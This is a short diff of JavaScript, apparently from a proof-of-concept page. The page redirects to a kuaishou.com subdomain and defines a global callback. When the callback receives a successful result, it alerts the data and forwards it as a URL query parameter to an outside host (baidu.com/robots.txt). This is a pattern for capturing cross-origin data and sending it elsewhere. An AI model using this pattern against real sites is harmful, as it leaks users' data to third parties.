@@ -13,9 +13,11 @@
       // 跳转
       location.href="https://bbbb.kuaishou.com";
       window.test=function test(a) {
-      	if (a.result === 1) {alert(JSON.stringify(a));};
-      	
-      	location.href=`https://www.baidu.com/robots.txt?a=${JSON.stringify(a)}`;
+      	if (a.result === 1) {
+			alert(JSON.stringify(a));
+			location.href=`https://www.baidu.com/robots.txt?a=${JSON.stringify(a)}`;
+		};
+    
   	};
       setTimeout(function(){
       for(let i=0; i<500; i++){
